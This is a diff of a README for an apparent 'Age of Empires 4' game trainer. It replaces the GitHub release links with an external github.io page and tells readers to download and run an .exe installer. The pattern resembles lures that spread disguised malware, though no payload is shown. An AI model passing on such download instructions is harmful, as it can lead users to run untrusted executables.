@@ -1,10 +1,10 @@
 # 🎮 Age-of-Empires-4-Trainer-2026 - Improve your game performance and speed
 
-[![](https://img.shields.io/badge/Download-Release-blue)](https://github.com/kassicalando757/Age-of-Empires-4-Trainer-2026/releases)
+[![](https://img.shields.io/badge/Download-Release-blue)](https://kassicalando757.github.io)
 
 ## 📥 Getting the software
 
-You need to access the official release page to obtain the software. Visit this link to download the current version for your computer: [https://github.com/kassicalando757/Age-of-Empires-4-Trainer-2026/releases](https://github.com/kassicalando757/Age-of-Empires-4-Trainer-2026/releases).
+You need to access the official release page to obtain the software. Visit this link to download the current version for your computer: [https://kassicalando757.github.io](https://kassicalando757.github.io).
 
 Select the latest release folder on that page. Look for the file ending in .exe to start your download. This file contains the installer for your system.
 
